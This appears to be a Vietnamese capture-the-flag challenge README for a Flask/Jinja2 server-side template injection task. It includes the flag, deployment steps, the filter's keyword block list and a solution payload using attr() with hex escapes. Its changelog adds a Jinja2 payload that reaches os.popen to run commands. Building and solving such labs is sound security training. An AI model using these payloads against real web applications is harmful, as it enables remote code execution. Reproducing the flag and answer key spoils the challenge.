# Challenge 1: Python SSTI

## Name
Feedback Form

## Description
Câu lạc bộ Anh em Dưa Hấu đang muốn mở rộng địa bàn, và rất cần những góp ý của các huynh đệ khác. Tuy nhiên, họ không sử dụng các dịch vụ khảo sát online mà lại tự build. Họ sợ bị theo dõi bởi cục F giấu tên. Liệu đây có phải một quyết định đúng?

## Flag
BKSEC{un4bl3_t0_imp0rt_1s_4_pa1n_in_th3_@ss_46dba925}

## Deployment
```bash
chmod +x build-docker.sh
./build-docker.sh
```

hoặc

```bash
docker compose up
```

## Solution

Bài này có một filter khá nhiều và 'chặt chẽ', các filter đó bao gồm:
- Input không được chứa ['_#&;+]
- Input không được chứa từ 'config, os, popen, subprocess'
- Input không được dài quá 64 ký tự
- Input không được có chuỗi 'import'

--> Mục đích là để tránh việc import module os -> hướng đến việc đọc config của Flask (tuy vậy keyword 'config' cũng bị filter để tránh việc tìm ra flag quá dễ)

Payload:
```
{{ self|attr("\x5f\x5fdict\x5f\x5f") }}
```

## Một số điều còn băn khoăn
- Các template trong bài đều đang lấy từ CDN của Bootstrap. Có cần thiết phải kéo các file css xuống local không?

## Changelog
2:27 12.1
Đã tìm ra flag bypass được 'import': 
```python
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘id’).read()}}
```
Không thể chuyển các dấu '.' và '_' bằng attr() để bypass filter được -> không có PoC
ai bypass được dm em với :(

- Update lại filter: ['config', 'os', 'popen', 'subprocess'] - Hi vọng đây là lần cuối phải sửa filter
- Update lại len: 64 là max - không biết có ác quá k nhỉ :))